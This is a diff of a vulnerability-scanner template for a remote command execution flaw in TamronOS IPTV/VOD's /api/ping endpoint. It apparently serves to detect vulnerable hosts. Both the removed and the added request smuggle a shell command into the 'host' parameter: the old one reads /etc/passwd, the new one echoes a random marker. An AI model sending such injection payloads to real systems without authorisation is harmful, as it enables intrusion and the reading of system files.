@@ -1,39 +1,25 @@
 id: tamronos-rce
-
 info:
   name: TamronOS IPTV/VOD - Remote Command Execution
-  author: pikpikcu
+  author:
+  - l0ne1y
+  description: |-
+    TamronOS IPTVVOD系统存在远程命令执行漏洞
+    TamronOS IPTV/VOD系统是一套基于Linux内核开发的宽带运营商、酒店、学校直播点播一体解决方案，该系统存在命令执行漏洞，攻击者可利用该漏洞执行系统命令。
   severity: critical
-  description: |
-    TamronOS IPTV/VOD contains a remote command execution in the 'host' parameter of the /api/ping endpoint.
-  reference:
-    - https://twitter.com/sec715/status/1405336456923471874
-  classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
-    cvss-score: 10
-    cwe-id: CWE-78
-    cpe: cpe:2.3:o:tamronos:tamronos:*:*:*:*:*:*:*:*
-  metadata:
-    verified: true
-    max-request: 1
-    shodan-query: title:"TamronOS IPTV系统"
-    fofa-query: title="TamronOS IPTV系统"
-    product: tamronos
-    vendor: tamronos
-  tags: tamronos,rce
-
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp"
-
-    matchers-condition: and
-    matchers:
-      - type: regex
-        regex:
-          - "root:.*:0:0:"
-
-      - type: status
-        status:
-          - 200
-# digest: 4a0a00473045022057abeed1aac5a444fafb1986cccf2c3d4c365b277ff5181546cba8996a76daed0221008c361ef9982e343cce0076eeb71e5d2051c44e5eb49d1cf1416469047dfeca99:922c64590222798bb761d5b6d8e72950
+  remediation: |-
+    #### 官方修复方案：
+    升级系统至无漏洞版本，或于官网下载安全补丁。
+requests:
+- matchers:
+  - type: dsl
+    dsl:
+    - contains(body,verify) && !contains(body,"%2Fapi%2Fping%3Fcount%3D5%26host%3D%3Becho")
+      && status_code==200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/api/ping?count=5&host=;echo%20{{verify}};&port=80&source=1.1.1.1&type=icmp'
+  method: GET
+  req-condition: true
+variables:
+  verify: '{{rand_text_alphanumeric(8,"")}}'
